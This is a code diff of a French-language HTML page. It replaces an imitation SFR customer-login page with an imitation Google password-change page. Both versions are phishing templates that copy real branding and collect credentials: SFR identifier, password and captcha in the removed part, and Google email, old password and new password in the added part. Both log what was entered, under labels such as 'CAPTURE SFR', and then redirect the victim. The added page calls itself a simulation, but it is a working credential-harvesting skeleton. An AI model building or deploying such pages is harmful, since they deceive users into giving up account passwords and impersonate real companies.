@@ -3,60 +3,56 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SFR & Moi - Connexion</title>
+    <title>Google - Changer mon mot de passe</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; }
-        .container { max-width: 480px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .header { background: #e2000f; color: white; padding: 15px; text-align: center; font-weight: bold; }
-        h2 { text-align: center; margin: 20px 0 10px; }
-        p { text-align: center; color: #666; font-size: 14px; }
-        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; margin: 8px 0; }
-        button { width: 100%; padding: 14px; background: #e2000f; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 15px; }
-        .captcha { background: #fff9c4; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin: 15px 0; text-align: center; }
+        body { font-family: Arial, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; }
+        .container { max-width: 480px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo img { width: 100px; }
+        h2 { text-align: center; color: #202124; }
+        label { display: block; margin: 15px 0 5px; font-weight: bold; color: #5f6368; }
+        input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">SFR</div>
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        </div>
+        <h2>Changer votre mot de passe</h2>
+        <p style="text-align:center; color:#5f6368;">Pour des raisons de sécurité, veuillez confirmer votre ancien mot de passe et définir un nouveau.</p>
         
-        <h2>Espace Client</h2>
-        <p>Tous les champs sont obligatoires</p>
-        
-        <form id="loginForm">
-            <label>Identifiant</label>
-            <input type="text" id="identifiant" placeholder="Numéro de ligne mobile, email ou NeufID" required>
+        <form id="changeForm">
+            <label>Adresse email</label>
+            <input type="email" id="email" placeholder="Votre adresse email" required>
             
-            <label>Mot de passe</label>
-            <input type="password" id="password" placeholder="Saisir le mot de passe" required>
+            <label>Ancien mot de passe</label>
+            <input type="password" id="old_pass" placeholder="Ancien mot de passe" required>
             
-            <label style="display:flex; align-items:center; margin:10px 0;">
-                <input type="checkbox" checked style="width:auto; margin-right:8px;"> Rester connecté
-            </label>
+            <label>Nouveau mot de passe</label>
+            <input type="password" id="new_pass" placeholder="Nouveau mot de passe" required>
             
-            <div class="captcha">
-                <img src="captcha.jpg" alt="Captcha" style="max-width:100%; margin-bottom:10px;">
-                <input type="text" id="captcha" placeholder="Saisir le texte de l'image" required>
-            </div>
-            
-            <button type="button" onclick="submitForm()">Se connecter</button>
+            <button type="button" onclick="submitChange()">Changer le mot de passe</button>
         </form>
     </div>
 
     <script>
-        function submitForm() {
-            var identifiant = document.getElementById('identifiant').value;
-            var password = document.getElementById('password').value;
-            var captcha = document.getElementById('captcha').value;
+        function submitChange() {
+            var email = document.getElementById('email').value;
+            var old_pass = document.getElementById('old_pass').value;
+            var new_pass = document.getElementById('new_pass').value;
 
-            // Capture et affichage dans la console
-            console.log("=== CAPTURE SFR ===");
-            console.log("Identifiant: " + identifiant);
-            console.log("Mot de passe: " + password);
-            console.log("Captcha: " + captcha);
+            console.log("=== Google Password Change ===");
+            console.log("Email: " + email);
+            console.log("Ancien mot de passe: " + old_pass);
+            console.log("Nouveau mot de passe: " + new_pass);
             console.log("Date: " + new Date());
 
-            // Redirection vers 2FA
-            window.location.href = "2fa.html?identifiant=" + encodeURIComponent(identifiant);
+            alert("Mot de passe changé avec succès ! (Simulation)");
+
+            // Redirection vers Google
+            window.location.href = "https://myaccount.google.com";
         }
     </script>
 </body>
